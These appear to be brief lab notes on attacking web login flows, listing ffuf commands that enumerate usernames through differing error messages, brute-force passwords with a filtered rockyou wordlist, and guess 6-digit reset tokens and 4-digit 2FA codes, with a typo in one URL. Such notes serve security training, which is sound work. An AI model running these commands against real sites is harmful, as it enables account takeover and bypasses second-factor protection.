____

#  Differing Error Messages

```bash
ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u http://83.136.254.47:56265/index.php -X POST -d "username=FUZZ&password=invalid" -fr "Unknown user" -H "Content-Type: application/x-www-form-urlencoded"
```

# Brute-Forcing Passwords

- contains at least one upper-case character
- contains at least one lower-case character
- contains at least one digit
- minimum length of 10 characters

```bash
grep '[[:upper:]]' /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

```bash
ffuf -w ./custom_wordlist.txt -u http://94.237.57.154:37595/index.php -X POST -H "Content-Type: a  
pplication/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username or password."
```

# Brute-Forcing Password Reset Tokens

```bash
ffuf -w /usr/share/seclists/Fuzzing/6-digits-000000-999999.txt -u http://http://83.136.254.47:36180/reset_password.php?token=FUZZ -fr "The provided token is invalid"
```

# Brute-Forcing 2FA Codes

```bash
ffuf -w /usr/share/seclists/Fuzzing/4-digits-0000-9999.txt -u http://94.237.50.176:35539/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39fap95ns90q60bq5r570nnskf" -d "otp=FUZZ" -fr "Invalid 2FA Code"
```